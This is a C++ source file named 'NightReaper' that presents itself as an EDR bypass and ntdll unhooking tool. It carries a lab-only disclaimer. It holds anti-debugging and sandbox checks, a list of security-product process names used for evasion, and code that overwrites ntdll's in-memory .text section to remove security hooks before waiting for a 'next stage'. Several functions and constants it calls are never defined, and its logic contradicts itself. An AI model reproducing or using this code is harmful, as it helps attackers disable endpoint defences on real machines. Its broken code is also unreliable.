// NightReaper.cpp - Kernel/Userland EDR Bypass & Syscall Unhooker
// EPO - Lab / Explicit Permission ONLY! 💀

#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <string>
#include <iomanip>
#include <chrono>
#include <random>
#include <fstream>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ntdll.lib")

// ================= CONFIG =================
#define MAX_HOOK_SCAN_DEPTH 64
#define SLEEP_JITTER 0.5

// ================= ANTI-ANALYSIS =================
bool IsDebuggerPresentAdvanced() {
    BOOL isDbg = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDbg);
    return isDbg || IsDebuggerPresent() || IsDebuggerPresent();
}

bool IsSandbox() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors <= 2) return true;
    if (GetModuleHandleA("SbieDll.dll")) return true; // Sandboxie
    return false;
}

bool IsEDRPresent() {
    const char* edrProcs[] = {
        "csagent.exe", "edrsensor.exe", "falcon-sensor.exe", "sentinelagent.exe",
        "msmpeng.exe", "cb.exe", "cfp.exe", "avastsvc.exe", "avgui.exe"
    };
    DWORD processes[1024], cbNeeded;
    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        for (unsigned i = 0; i < cbNeeded / sizeof(DWORD); i++) {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
            if (hProc) {
                char name[MAX_PATH];
                if (GetModuleBaseNameA(hProc, NULL, name, sizeof(name))) {
                    for (const auto& edr : edrProcs) {
                        if (_stricmp(name, edr) == 0) {
                            CloseHandle(hProc);
                            return true;
                        }
                    }
                }
                CloseHandle(hProc);
            }
        }
    }
    return false;
}

// ================= SYSCALL UNHOOKING =================
PVOID GetCleanNtdllSection(const char* sectionName) {
    HMODULE hDisk = LoadLibraryExW(L"ntdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hDisk) return nullptr;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hDisk;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hDisk + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sec[i].Name, sectionName) == 0) {
            BYTE* clean = new BYTE[sec[i].Misc.VirtualSize];
            memcpy(clean, (BYTE*)hDisk + sec[i].VirtualAddress, sec[i].Misc.VirtualSize);
            FreeLibrary(hDisk);
            return clean;
        }
    }

    FreeLibrary(hDisk);
    return nullptr;
}

bool UnhookNtdllText() {
    HMODULE hMem = GetModuleHandleW(L"ntdll.dll");
    if (!hMem) return false;

    BYTE* cleanText = (BYTE*)GetCleanNtdllSection(".text");
    if (!cleanText) return false;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMem;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMem + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sec[i].Name, ".text") == 0) {
            DWORD oldProtect;
            VirtualProtect((LPVOID)((BYTE*)hMem + sec[i].VirtualAddress),
                           sec[i].Misc.VirtualSize,
                           PAGE_EXECUTE_READWRITE,
                           &oldProtect);

            memcpy((BYTE*)hMem + sec[i].VirtualAddress, cleanText, sec[i].Misc.VirtualSize);

            VirtualProtect((LPVOID)((BYTE*)hMem + sec[i].VirtualAddress),
                           sec[i].Misc.VirtualSize,
                           oldProtect,
                           &oldProtect);

            delete[] cleanText;
            return true;
        }
    }

    delete[] cleanText;
    return false;
}

// ================= HOOK SCANNER =================
void ScanNtdllForHooks() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;

    std::vector<std::string> ntFuncs = {
        "NtCreateFile", "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
        "NtCreateThreadEx", "NtQueueApcThread", "NtDelayExecution",
        "NtProtectVirtualMemory", "NtResumeThread", "NtQueryInformationProcess"
    };

    std::cout << "[" << timestamp() << "] Scanning NTDLL for hooks...\n";

    for (const auto& func : ntFuncs) {
        FARPROC addr = GetProcAddress(hNtdll, func.c_str());
        if (addr) {
            BYTE* p = (BYTE*)addr;
            bool hooked = false;

            if (p[0] == 0xE9 || p[0] == 0xE8) hooked = true; // jmp/call
            if (*(WORD*)p == 0x25FF) hooked = true; // jmp [rip]
            if (*(DWORD*)p == 0xB8C3) hooked = true; // mov eax, xx; ret (common trampoline)

            std::cout << "  " << func << " at " << addr << " -> " << (hooked ? "HOOKED" : "CLEAN") << "\n";
        }
    }
}

// ================= MAIN =================
int main() {
    if (IsDebuggerPresentAdvanced() || IsSandbox() || IsEDRPresent()) {
        ExitProcess(0);
    }

    std::cout << "[" << timestamp() << "] NightReaper starting...\n";

    ScanNtdllForHooks();

    std::cout << "[" << timestamp() << "] Attempting full NTDLL unhooking...\n";
    if (UnhookNtdllText()) {
        std::cout << "[" << timestamp() << "] NTDLL .text restored - clean syscalls restored\n";
    } else {
        std::cout << "[" << timestamp() << "] Unhook failed - manual cleanup required\n";
    }

    std::cout << "[" << timestamp() << "] EDR evasion status: " << (IsEDRPresent() ? "EDR DETECTED" : "CLEAN") << "\n";

    // Keep alive for injection / next stage
    while (true) {
        SleepObfuscated(random() % (SLEEP_MAX - SLEEP_MIN) + SLEEP_MIN);
    }

    return 0;
}